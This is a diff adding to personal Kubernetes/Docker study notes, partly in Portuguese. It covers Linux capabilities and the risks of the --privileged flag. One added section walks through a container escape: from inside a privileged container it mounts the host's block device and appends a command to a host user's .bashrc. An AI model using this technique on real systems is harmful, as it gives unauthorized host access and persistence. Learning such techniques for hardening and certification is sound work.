@@ -325,6 +325,49 @@ fernando@debian10x64:~/cursos/cka-certified-kubernetes-administrator$
 
 
 
+
+
+
+## Excessive Capabilities
+Running a Docker container with --privileged or dangerous capabilities allows privileged operations.
+The --privileged flag gives all  to the container, and it also lifts all the limitations enforced by the device cgroup controller. In other words, the container can then do almost everything that the host can do.
+
+
+
+## Abusing exposed host directories
+
+Assusme, the /home directory is exposed by /dev/sdb1 within a privileged container. In such case, you can generate a device node for that block device, mount it into the container, and gain access to host's /home directory.
+$ docker run --privileged -it --rm alpine:latest
+/ $ apk update && apk add util-linux
+# ...
+/ $ lsblk
+NAME      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sda         8:0    0   45G  0 disk
+├─sda1      8:1    0 40.9G  0 part /etc/hosts
+├─sda2      8:2    0   16M  0 part
+├─sda3      8:3    0    2G  0 part
+│ └─vroot 253:0    0  1.2G  1 dm
+├─sda4      8:4    0   16M  0 part
+├─sda5      8:5    0    2G  0 part
+├─sda6      8:6    0  512B  0 part
+├─sda7      8:7    0  512B  0 part
+├─sda8      8:8    0   16M  0 part
+├─sda9      8:9    0  512B  0 part
+├─sda10     8:10   0  512B  0 part
+├─sda11     8:11   0    8M  0 part
+└─sda12     8:12   0   32M  0 part
+sdb         8:16   0    5G  0 disk
+└─sdb1      8:17   0    5G  0 part
+zram0     252:0    0  768M  0 disk [SWAP]
+/ $ mknod /dev/sdb1 block 8 17
+/ $ mkdir /mnt/host_home
+/ $ mount /dev/sdb1 /mnt/host_home
+/ $ echo 'echo "Hello from container land!" 2>&1' >> /mnt/host_home/eric_chiang_m/.bashrc
+
+
+
+
+
 # ###################################################################################################################### 
 # ###################################################################################################################### 
 # ###################################################################################################################### 
@@ -338,3 +381,8 @@ fernando@debian10x64:~/cursos/cka-certified-kubernetes-administrator$
 - Adicionando uma Linux Capability:
     docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash
 
+- Removendo todas Capabilities e adicionado apenas uma:
+    docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
+
+- A flag --privileged garante todas permissões possíveis ao Container, inclusive aquelas que afetam o host:
+    docker run --privileged -it --rm alpine:latest
